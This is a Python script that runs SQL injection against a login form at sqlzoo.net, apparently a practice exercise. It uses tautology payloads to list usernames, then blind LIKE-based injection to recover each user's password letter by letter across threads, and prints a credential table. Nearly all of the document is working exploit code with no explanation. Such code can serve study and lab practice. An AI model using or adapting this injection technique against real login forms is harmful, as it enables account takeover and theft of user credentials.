import requests, string
import threading

URL = 'http://sqlzoo.net/hack/passwd.pl'
LETTERS = string.ascii_lowercase

def verify_success(text):
    if text.startswith('Welcome'):
        return True # successfully logged in
    if text.startswith('Incorrect user name or password. Try again.'):
        return False # not logged in

    print('Unfamiliar text...')
    print(text)
    return False

# `limit` specifies how many usernames to return
def find_usernames(limit):
    def extract_username(text):
        return text[text.index('<b>') + 3 : text.index('</b>')]

    usernames = []
    running_query = "' OR ''='"
    for i in range(limit):
        payload = {
            'name': running_query,
            'password': running_query
        }

        res = requests.post(URL, data=payload)
        try:
            temp_username = extract_username(res.text)
        except ValueError: # when we have found all usernames
            return usernames

        usernames.append(temp_username)
        # omitting the newly-found username from the query
        running_query += f"' AND name <> '{temp_username}"

    return usernames

def find_password(username):
    print(f"Starting hacking {username}'s account...")

    payload = {
        'name': username,
        'password': ''
    }

    def find_inplace(loc):
        expression = '_' * loc + '%s%'
        for letter in LETTERS:
            expression = '_' * loc + letter + '%'
            payload['password'] = f"' OR EXISTS(SELECT * FROM users WHERE name='{username}' AND password LIKE '{expression}') AND ''='"

            res = requests.post(URL, data=payload)
            if verify_success(res.text):
                #print(f'Found letter at {loc} being "{letter}"')
                return letter

        return False

    current_pwd = ''
    loc = 0
    res = requests.post(URL, data=payload)

    while not verify_success(res.text):
        current_pwd += find_inplace(loc)
        print(f'Current password for {username}: {current_pwd}')

        payload['password'] = current_pwd
        #print(payload)
        res = requests.post(URL, data=payload)

        loc += 1

    print(f'Found complete password for {username}: {current_pwd}')
    #return username, current_pwd
    results.append((username, current_pwd))

if __name__ == '__main__':
    usernames = find_usernames(10)
    print('All found usernames:')
    print(usernames)

    results = [('username', 'password')]
    threads = []

    print('Starting hacking passwords...')
    for username in usernames:
        temp_thread = threading.Thread(target=find_password, args=(username,))
        temp_thread.start()
        threads.append(temp_thread)
    for thread in threads:
        thread.join()

    print('Final password table:')
    print('*' * 40)
    for username, password in results:
        print('%-12s%-12s' % (username, password))
        print('-' * 24)
